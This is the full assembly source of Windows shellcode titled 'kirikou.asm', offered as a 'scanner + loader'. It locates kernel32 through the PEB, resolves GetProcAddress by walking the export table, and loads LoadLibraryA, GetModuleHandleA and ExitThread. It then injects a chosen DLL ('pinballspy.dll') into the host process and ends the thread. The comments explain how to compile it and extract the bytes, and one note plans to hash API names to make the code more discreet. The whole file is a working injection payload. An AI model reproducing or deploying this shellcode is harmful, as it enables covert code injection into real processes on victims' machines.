; kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): scanner + loader

; What is this ?
;		- Current thread loads a specified dll (by default pinballspy.dll) into process, and then suicides!
;	        - All APIs needed are ripped from process image; nothing is hard-coded.

; TODO XXX use API name hashes instead of strings (les opcodes seront plus discr�t et moins lourd!)


; 4CKNOWLEDGEMENT5: 
; 1]-- HARMONY SECURITY (http://blog.harmonysecurity.com/2009_06_01_archive.html)
; 2]-- http://www.infond.fr/2009/09/tutoriel-initiation-aux-shellcodes.html      
; 3]-- phr4ck Issue 0x3e by sk <sk at scan-associates d0t net>

; compile with 'nasm -f bin -o kirikou.bin kirikou.asm'
; Use some opcode wizard to extract the generated shellcode. I use PYHTON. Viz, shellcode = open('kirikou.bin', 'rb').read()
; You have the fire!


[SECTION .text]

; set the code to be 32-bit
; Tip: If you don't have this line in more complex shellcode,
;    the resulting instructions may end up being different to
;    what you were expecting.
BITS 32

global _start

_start:
    xor eax,eax
    xor ebx,ebx ;registres � zero
    xor ecx,ecx
    xor esi,esi
    xor edi,edi
    jmp get_kernel32
    
get_kernel32:
    ; the following instructions are courtesy of HARMONY SECURITY (http://blog.harmonysecurity.com/2009_06_01_archive.html)
    mov edx, [fs:0x30]		; get a pointer to the PEB
    mov edx, [edx + 0x0C]	; get PEB->Ldr
    mov edx, [edx + 0x14]	; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov edx, [edx]		; get the next entry (2nd entry)
    mov edx, [edx]		; get the next entry (3rd entry)
    mov edx, [edx + 0x10]	; get the 3rd entries base address (kernel32.dll)
    
get_export_directory_table:
    mov ebx, [edx + 0x3c] ; eax = offset signature PE dans Kernel32
    mov ebx, [edx + ebx + 0x78] ; ebx = offset Export Directory Table dans Kernel32
    add ebx,edx ; ebx = adresse Export Directory Table
    
get_GetProcAddress_address:
    mov ecx, [ebx+0x18] ; ecx = nbre de fonctions export�es (compteur)
    mov eax, [ebx+0x20] ; eax = Offset Export Name Pointer Table dans Kernel32
    add eax,edx ; eax = Adresse Export Name Pointer Table
    
get_GetProcAddress_address_loop:
    dec ecx ; dec compteur nombre exports
    jmp get_GetProcAddress_string ; pile <- adresse string 'GetProcAddress'
    
get_GetProcAddress_string_return:
    pop edi ; edi = 'GetProcAddress'
    mov esi,[eax+ecx*4] ; esi = ordinal 'NomFonction\n' dans Name Pointer Table
    add esi,edx ; esi = adresse 'NomFonction\n' dans Name Pointer Table
    push ecx ; sauvegarde ecx
    xor ecx,ecx
    add cl,14 ; ecx = nbre caract�res dans GetProcAddress
    repe cmpsb ; compare chaines edi et esi
    pop ecx ; ecx = compteur nombre exports
    jnz get_GetProcAddress_address_loop
    mov eax, [ebx+0x24] ; eax = offset Ordinal Table dans Kernel32
    add eax,edx ; eax = adresse Ordinal Table
    mov cx, [eax+ecx*2] ; cx = ordinal de la fonction - num�ro du 1er ordinal
    mov ax,[ebx+0x10] ; eax = num�ro du premier ordinal de la table
    add cx,ax ; cx = ordinal de la fonction
    dec cx ; pour tomber juste (ordinal d�bute � 0)
    mov eax,[ebx+0x1c] ; eax = offset Export Address Table
    add eax,edx ; eax = adresse Export Address Table
    mov eax,[eax+ecx*4] ; eax = offset de GetProcAddress dans Kernel32
    add eax,edx 
    mov ebx, eax ; ebx = adresse GetProcAddress
    jmp get_stuff_to_load_from_kerne32
    
get_stuff_to_load_from_kerne32_return:
    pop 	esi		; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
    mov 	edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll progressively 
				; override the said said table with addresses of the the loaded APIs. BTW, we won't be 
				; needing the table in future!
    call	load_apis	; when this returns, edi points to table of API addresses
    jmp		grab_dll_handle
    
load_apis:
    nop				; @description: loads a bunch of APIs from a DLL
				; Here, I expect:
				; 1]-- edx set to the address of the DLL from which we'll load the APIs
				; 2]-- esi pointing to the NULL-seperated list/table of to-be-loaded APIs
				; 3]-- ebx set to the address of GetProcAddress
    
load_next_api:
    lodsb
    test	al,al
    jnz         load_next_api

check_end_of_API_table:
    lodsb
    dec		esi 		; fix-up
    test	al,al
    jz 		load_apis_end	

continue_load_nex_api:
    push	ebx  		; save
    push 	edx		; save
    push	esi  
    push	edx  		; DLL address
    call	ebx  		; GetProcAddress(DLL address, API_Name);
    ; int3			; uncomment this INT3 and inspect eax in a debugger (ollydbg?) if u will
    pop edx			; restore 
    pop	ebx			; restore   
    stosd			; write the output to EDI
    jmp		load_next_api	;

load_apis_end:
    ret				; j ==> edi - 4*j, for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
    
grab_dll_handle:
    jmp get_dll_path
    
get_dll_path_return:
    pop		ecx 		; dll path address
    push	ecx		; save, we may need it in load_dll	
    push 	ecx
    call 	[edi - 0xC]	; GetModuleHandleA(dll path address)
    test 	eax,eax
    pop ecx			; restore
    jz load_dll
    jmp quit

load_dll:
    nop				; I expect ecx to point to dll path in memory
    push 	ecx
    call 	[edi - 8] 	; LoadLibraryA(dll path address)
    test 	eax,eax
    jz 		error
    jmp 	quit

error:
    nop				; this is just a stub

quit:
    push 	0x0
    call	[edi - 4]	; ExitThread(0x0)	
    
get_GetProcAddress_string:
    call get_GetProcAddress_string_return
				; the above call will push the address of the  NULL-terminated "GetProcAddress" string, 
				; and then jump to the get_stuff_to_load_from_kerne32_return label
    db 'GetProcAddress'
    db 0x0
    
get_stuff_to_load_from_kerne32:
    call get_stuff_to_load_from_kerne32_return
				; the above call will push the address of the following table, and then jump to the
				; get_stuff_to_load_from_kerne32_return label
    db 0x00 			; marks beginning of next table entry
    db "GetModuleHandleA"
    db 0x00
    db "LoadLibraryA"
    db 0x00
    db "ExitThread"
    db 0x0
    db 0x0 ; marks end of this list of API names

get_dll_path:
    call get_dll_path_return
				; The above call will push the address of the NULL-terminated dll path below, and then jump 
				; to get_dll_path_return label. Change the path accordingly if you wish to load another DLL.
    db "C:\\users\\rude-boi\\Documents\\Visual Studio 2010\\Projects\\pinballspy\\Debug\\pinballspy.dll"	
    db 0x00 			; NULL   	




